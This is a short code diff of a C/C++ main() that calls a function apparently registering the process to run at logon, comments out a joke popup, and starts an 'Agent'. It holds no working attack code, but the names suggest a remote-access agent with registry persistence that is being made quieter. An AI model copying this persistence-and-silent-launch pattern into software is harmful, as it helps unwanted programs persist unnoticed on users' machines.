@@ -14,7 +14,7 @@ int main(int argc, char* argv[]) {
 
     CurrentProcRegistryLogon();
 
-    PopUp("Yo yo", POPUP_LOOP_CAPTION);
+    //PopUp("Yo yo", POPUP_LOOP_CAPTION);
 
     Agent agent;
     agent.start();
